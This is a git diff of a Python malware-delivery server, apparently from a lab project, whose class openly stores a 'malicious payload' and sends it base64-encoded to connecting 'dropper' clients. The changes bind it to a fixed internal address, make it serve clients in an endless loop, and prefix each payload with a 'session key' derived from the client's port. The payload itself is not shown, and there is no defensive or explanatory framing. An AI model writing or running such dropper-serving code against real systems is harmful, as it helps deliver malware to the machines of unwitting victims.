@@ -7,6 +7,8 @@
 import base64
 import logging
 import socket
+import os
+import secrets
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -30,7 +32,7 @@ class Server:
 
     @port.setter
     def port(self, new_port):
-        f""" Sets the port the server listens to into {new_port}"""
+        """ Sets the port the server listens to into {new_port}"""
         self._port = new_port
 
     @property
@@ -42,21 +44,31 @@ class Server:
         """ Initialize server before the session. """
         try:
             # Binds the server to the port and listens to the port.
-            self.socket.bind(('', self._port))
+            self.socket.bind(('10.0.2.6', self._port))
             self.socket.listen()
             logging.debug('Server was successfully initialized.')
         except socket.error:
             print('Server was not initialized due to an error.')
+    
+    def encode_integer(self, num):
+        num_bytes = num.to_bytes((num.bit_length() + 7) // 8, 'big')
+        print(num_bytes)
+        encoded_bytes = base64.b64encode(num_bytes)
+        return encoded_bytes
+
 
     def send_malicious_code(self):
         """ Send malware to the client once the connection is established. """
         # Establish a connection with the client.
-        connection, address = self.socket.accept()
-        with connection:
-            print('Connection with dropper established from {}'.format(address))
-            # Send data to the client and shut down the server.
-            encoded_payload = base64.b64encode(self.malicious_code)
-            connection.send(encoded_payload)
+        while True:
+            connection, address = self.socket.accept()
+            with connection:
+                print('Connection with dropper established from {}'.format(address))
+                session_key = self.encode_integer(address[1])
+                print(session_key, address[1])
+                encoded_payload = base64.b64encode(self.malicious_code)
+                connection.send(session_key)
+                connection.send(encoded_payload)
 
 
 if __name__ == '__main__':
